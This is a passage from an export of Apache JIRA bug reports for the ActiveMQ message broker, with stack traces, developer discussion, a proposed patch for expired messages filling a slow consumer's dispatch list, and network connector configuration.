        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) [activemq-all-5.4.0.jar:5.4.0]
        at java.lang.Thread.run(Thread.java:619) [na:1.6.0_20]
13 Sep 2010 05:53:30 (JMS) [] Async error occurred: java.lang.RuntimeException: java.lang.NullPointerException
java.lang.RuntimeException: java.lang.NullPointerException
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:228) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) [activemq-all-5.4.0.jar:5.4.0]
        at java.lang.Thread.run(Thread.java:619) [na:1.6.0_20]
Caused by: java.lang.NullPointerException: null
        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:231) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) ~[activemq-all-5.4.0.jar:5.4.0]
        ... 24 common frames omitted

Looking at the code, it appears to me that the only way an NPE can be thrown at that place is if list is null. Since the same method however tests for that exact case, I suspect there is unsynchronized concurrent access to the LinkedNode.

A few hours later we got more failures:

13 Sep 2010 08:38:19 (JMS) [] Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 29114496, responseRequired = false, messageId = ID:arctic01.csc.fi-39780-1280232016428-0:0:2:1:333447, originalDestination = null, originalTransactionId = null, producerId = ID:arctic01.csc.fi-39780-1280232016428-0:0:2:1, destination = queue://cells.domain.dCacheDomain, transactionId = null, expiration = 0, timestamp = 0, arrival = 0, brokerInTime = 1284359899636, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@6f28b428, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursor 
java.lang.NullPointerException: null
        at org.apache.kahadb.util.LinkedNode.isHeadNode(LinkedNode.java:64) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:230) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) [activemq-all-5.4.0.jar:5.4.0]
        at java.lang.Thread.run(Thread.java:619) [na:1.6.0_20]
13 Sep 2010 08:38:19 (JMS) [] Async error occurred: java.lang.RuntimeException: java.lang.NullPointerException
java.lang.RuntimeException: java.lang.NullPointerException
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:228) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) [activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) [activemq-all-5.4.0.jar:5.4.0]
        at java.lang.Thread.run(Thread.java:619) [na:1.6.0_20]
Caused by: java.lang.NullPointerException: null
        at org.apache.kahadb.util.LinkedNode.isHeadNode(LinkedNode.java:64) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:230) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) ~[activemq-all-5.4.0.jar:5.4.0]
        ... 24 common frames omitted

We got a number of those exceptions with the same stack trace and then followed by tons of other NullPointerExceptions, likely because the list was corrupted at that point.


Not long after these stack traces message delivery began to hang. A restart of the broker only helped temporarily as message delivery would hang again after half a minute or so. To our big suprise moving the db directory to let ActiveMQ create a new database didn't solve the problem either. I am unable to tell to what extend that was caused by the above exceptions or not.

We are happy to provide any other information you may need to debug this problem.","java version ""1.6.0_20""
Java(TM) SE Runtime Environment (build 1.6.0_20-b02)
Clients connection to the broker use Active MQ 5.3.0 or 5.3.2.",behrmann,jira-bot,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Sep/10 09:41;gtully;AMQ2910Test.java;https://issues.apache.org/jira/secure/attachment/12461868/AMQ2910Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14826,,,Thu Sep 01 15:55:16 UTC 2016,,,,,,,,,,,"0|i0ba1r:",63740,,,,,,,,,,,,,,,,,,,,,"13/Sep/10 12:33;gtully;That NPE is coming from the cursor so it is using the temp store. If it occurs after a restart you may have a test case in the making because the temp store does not persist through restarts. it is recreated as needed.
It would be great of you could wrangle up a test app that can reproduce.

As a workaround, consider using the default store cursor rather than the file pending message cursor.;;;","13/Sep/10 12:50;behrmann;Unfortunately the exceptions did *not* occur again after a restart.

What did happen after a restart was that message delivery was very shaky. Message delivery worked to some clients and not to others. I have absolutely no idea why. I suspect that those NPEs corrupted some state (possibly in the clients) that survived the broker restart.  It was not possible for us to restart all clients at once, as they are not under our direct control.

As this happened on a large production system that we could not afford to keep down for debugging we have temporarily switched back to our old (non-JMS) messaging system.

Thanks for the tip about a possible workaround. ;;;","16/Sep/10 09:41;gtully;Attaching a test case that can reproduce this exception. ;;;","16/Sep/10 17:10;gtully;resolve in r997849

would  be great if you could validate tonight's 5.5-SNAPSHOT or build trunk yourself to validate.;;;","01/Sep/16 15:55;jira-bot;Commit a0d05f8ea3e883a16d86b4a6755f7fc1a503f55b in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=a0d05f8 ]

AMQ-2910 fix timing on test timeout - ensure consumer connection is started
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Slow consumer stops receiving messages because PrefetchSubscription.dispatched is filled with expired messages.,AMQ-2908,12483856,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,siim_kaalep,siim_kaalep,10/Sep/10 06:27,20/Sep/11 10:42,14/Jul/23 05:43,29/Jul/11 13:30,5.3.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Slow consumer gets stuck when consuming from queue that has expiring messages in it. 

Looked into broker while it got stuck and saw that PrefetchSubscription.dispatched is full of expired messages.

WORKAROUND
Into doActualDispatch added check that if subscription is full, it will remove all expired message from dispatch.

{code}
Index: trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java
===================================================================
--- trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java               (revision 42304)
+++ trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java            (working copy)
@@ -400,6 +400,21 @@
         }
     }
 
+   public void removeExpiredMessagesFromDispatch() {
+     synchronized(dispatchLock) {
+                  for (Iterator<MessageReference> iter = dispatched.iterator(); iter.hasNext(); ) {
+                    final MessageReference node = iter.next();
+                    if (node.isExpired()) {
+                        if (broker.isExpired(node)) {
+                            node.getRegionDestination().messageExpired(context, this, node);
+                        }
+                        dispatched.remove(node);
+                        node.getRegionDestination().getDestinationStatistics().getInflight().decrement();
+                    }
+                  }
+     }
+   }
+    
     /**
      * Checks an ack versus the contents of the dispatched list.
      * 
{code}

{code}
Index: trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java
===================================================================
--- trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java           (revision 42304)
+++ trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java        (working copy)
@@ -1543,6 +1543,9 @@
                 }
                 if (dispatchSelector.canSelect(s, node)) {
                     if (!fullConsumers.contains(s)) {
+                               if (s.isFull() && s instanceof PrefetchSubscription) {
+                                             ((PrefetchSubscription)s).removeExpiredMessagesFromDispatch();
+                               }
                         if (!s.isFull()) {
                             // Dispatch it.
                             s.add(node);

{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14751,,,Fri Jul 29 13:30:20 UTC 2011,,,,,,,Patch Available,,,,"0|i0agz3:",59023,,,,,,,,,,,,,,,,,,,,,"10/Sep/10 09:09;gtully;do you have a test case for this?;;;","10/Sep/10 12:07;siim_kaalep;{quote}
do you have a test case for this?
{quote}
Regrettably, no.;;;","10/Sep/10 12:49;gtully;a code change like that without a test to validate is just a good start. To have it committed to trunk it needs a test to validate: 
1) the issue still exists
2) to protect the fix into the future

I guess a slow client ack consumer can fill the prefetch and an appropriate ttl can have them expire, but I wonder what type of client would cause this behavior is real life, until it acks there will be no further dispatch.
There is an existing check for message expiry on dispatch and on receiving an ack.;;;","15/Oct/10 13:36;pmorris;hmmm i am wondering if i am seeing the same issue here, unfortunately the original stack trace or indication of why the user thinks this is a bug was not included but i am seeing the same sort of thing and the broker produced the following stack trace:

2010-09-05 09:07:51,844 | ERROR | Failed to page in more queue messages  | org.apache.activemq.broker.region.Queue | Queue:CORE-IN-QUEUE
java.lang.OutOfMemoryError: Java heap space
                at java.util.Arrays.copyOf(Unknown Source)
                at java.util.concurrent.CopyOnWriteArrayList.add(Unknown Source)
                at org.apache.activemq.broker.region.PrefetchSubscription.dispatch(PrefetchSubscription.java:630)
                at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:592)
                at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:158)
                at org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:1548)
                at org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1500)
                at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1585)
                at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1219)
                at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
                at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

we are using 5.3.1 by the way, and i will hopefully upgrade to 5.4.1 next week and retry

in our case we have very slow consumers in certain conditions, because they recieve the message and post it out to a web endpoint, and at various points during the year the web endpoint is taken offline, causing us the above problem.... 

we do have a test case here, but it is kind of explicitly linked into stopping and starting our services, and pulling the IP stack down, so it is kind of difficult to repost that one, and it takes about 2 days for it to actually kill the system after 300 messages per second;;;","04/Nov/10 18:45;gtully;I tried to reproduce this issue with a test case. The test case is committed at apache as it works ok: http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/usecases/ExpiredMessagesWithNoConsumerTest.java?view=diff&r1=1031135&r2=1031136&pathrev=1031136
It is a variant of a slow consumer test, in the original the consumer blocks and only acks when all the messages in the queue have expired. So it will have received 600 (prefetch) messages and they will be in the prefetchsubscription.dispatched list on the broker. The test verifies that all of these messages expire.
The variation of that test to validate this issue adds another batch of messages with no expiry and validates that the consumer can receive them, so it proves that expiring messages in the dispatched list does not block the consumer.

Could you look at the test case to see if any of the options used in the test do not match your use case?;;;","05/Nov/10 09:18;siim_kaalep;After performing more tests I also observed the appearance of OutOfMemoryError. I would like to raise the theoretical case that OutOfMemoryError caused some thread to die that was supposed to perform maintenance for the dispatched list. Leading to a situation wherein the expired messages clogged the processing of the dispatched list.

If that would be the case, then the current fix is redundant and the real problem is what caused that OutOfMemoryError.;;;","05/Nov/10 10:51;gtully;yes, with an OOM all bets are off as any thread can die and it is not possible to restart them when there is no heap. 
There is a bunch of information related to memory usage and trouble shooting at: http://activemq.apache.org/javalangoutofmemory.html;;;","29/Jul/11 13:30;tabish;The addition of the inactive destination cleanup and the auto sweep for expired messages should resolve this issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Seeing messages getting ""stuck"" on brokers w/o application consumers",AMQ-2906,12483520,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,cvelo,cvelo,08/Sep/10 22:05,10/Sep/10 20:12,14/Jul/23 05:43,10/Sep/10 20:12,5.4.0,,,,,,,,Broker,,,,0,,,,,,,,,"Seeing messages moved around between brokers and occasionally getting ""stuck"" on brokers w/o application 
consumers on it (even though the broker might have an ActiveMQ consumer attached to it).  I can still see messages
getting Enqueued and Dequeued on the broker containing the ""stuck"" messages, but the ""stuck"" messages never
move (have some messages that have been on the queue for 1hour+).

Current setup:
• 3 Producers
• 3 brokers
• 3 Application consumers (which are using ActiveMQ connection pooling)

• 2 application consumers --> broker1
• 1 application consumer --> broker2
• broker3 <-- 0 application consumers

----

This is what the networkConnector string looks like in the activemq.xml file on the server side:
(note: line breaks are for readability - in practice it is a single line w/o the ""\"" at the end of each line)

{code}
        <networkConnector name=""ActiveMQ Cluster"" uri=""static:(tcp://broker1:61616,tcp://broker2:61616,tcp://broker3:61616)"" \
          conduitSubscriptions=""true"" dynamicOnly=""true"" decreaseNetworkConsumerPriority=""false"" \
          suppressDuplicateQueueSubscriptions=""true"" duplex=""false"" networkTTL=""5""/>
{code}

----

This is what the broker.url string looks like in on the client side:
(note: line breaks are for readability - in practice it is a single line w/o the ""\"" at the end of each line)

{code}
amq.publisher.broker.url=failover\:tcp\://broker1\:61616?wireFormat.maxInactivityDuration=0&daemon=true,\
                                                              tcp\://broker2\:61616?wireFormat.maxInactivityDuration=0&daemon=true,\
                                                              tcp\://broker3\:61616?wireFormat.maxInactivityDuration=0&daemon=true
{code}

----

+To reproduce:+
* start up multiple Producers, sending messages to the 3 brokers
* start up only 2 consumers connected to 2 of the 3 brokers.

----

It would be nice if there was a maxQueueTimeout parameter that could
be set by the user, so that if a message has been on a queue for over 
